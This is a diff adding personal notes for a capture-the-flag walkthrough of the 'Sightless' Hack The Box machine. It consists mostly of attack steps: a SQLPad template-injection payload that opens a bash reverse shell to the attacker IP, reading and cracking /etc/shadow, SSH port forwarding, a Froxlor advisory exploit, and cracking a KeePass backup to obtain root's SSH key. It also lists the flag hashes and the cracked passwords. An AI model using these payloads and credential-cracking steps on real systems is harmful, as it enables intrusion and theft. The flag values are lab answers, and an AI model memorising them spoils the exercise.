@@ -1,0 +1,125 @@
+Target IP: 10.10.11.32
+
+Attacking IP: 10.10.14.66
+
+flag:
+
+User : 408ce2f68696465375fdeb2624811fd1
+Root : 33f299f049d3655e24c533997b07f9bd
+
+
+Steps:
+1. nmap -sV -sC -p- -oA nmap 10.10.11.32
+2. Add sqlpad.sightless.htb to /etc/hosts
+3. Create a new Connection
+    Name : Test
+    Driver : MySQL
+
+    Database :
+{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i
+>& /dev/tcp/10.10.14.66/1261 0>&1" > /tmp/exploit.sh') }}
+
+4. Start netcat
+    nc -lvnp 1261
+
+5. Create another new Connection to reverse shell
+    Name : Test
+    Driver : MySQL
+
+    Database :
+{{ process.mainModule.require('child_process').exec('/bin/bash /tmp/exploit.sh')
+}}
+
+6. whoami
+7. cat /etc/passwd, copy to local as passwd_michael
+
+  michael:x:1001:1001::/home/michael:/bin/bash
+
+8. cat /etc/shadow, copy to local as shadow_michael
+
+  michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
+
+9. unshadow passwd_michael shadow_michael > unshadow_michael
+
+10. john -w=~/pentesting/wordlists/rockyou.txt unshadow_michael
+
+  michael
+  insaneclownposse
+
+11. ssh michael@10.10.11.32
+
+12. cat user.txt
+
+
+Privillege Escalation
+
+13. netstat -lnpt
+
+    Found port 8080
+
+14. Port forward
+  
+    ssh michael@sightless.htb -L 8081:127.0.0.1:8080
+
+15. Go to 127.0.0.1:8081
+
+16. Intercept login request
+
+17. Get payload from https://github.com/advisories/GHSA-x525-54hf-xr53
+
+17. Put loginname as payload, changing "https://demo.froxlor.org/" to "http://admin.sightless.htb:8080". Base 64 encode
+
+18. Send request, and Log in with 
+    
+    abcd
+    Abcd@@1234
+
+19. Change FTP user web1's password
+
+20. lftp web1@sightless.htb
+
+21. set ssl:verify-certificate false
+
+22. get goaccess/backup/Database.kdb
+
+23. keepass2john Database.kdb > Database.kdb_hash
+
+24. john -w=~/pentesting/wordlists/rockyou.txt Database.kdb_hash
+
+    bulldogs
+
+25. kpcli --kdb=Database.kdb
+
+26. ls General/sightless.htb/Backup
+
+    0. ssh
+
+27. show -f ssh
+    
+    root
+    q6gnLTB74L132TMdFCpK
+
+28. attach ssh
+
+    Save to sightless/id_rsa
+
+29. chmod 600 id_rsa
+
+30. Add a line after  -----END OPENSSH PRIVATE KEY-----
+
+31. xxd id_rsa
+
+32. dos2unix id_rsa
+
+33. ssh -i id_rsa root@sightless.htb
+
+34. cat root.txt
+
+  
+
+ 
+
+
+
+
+
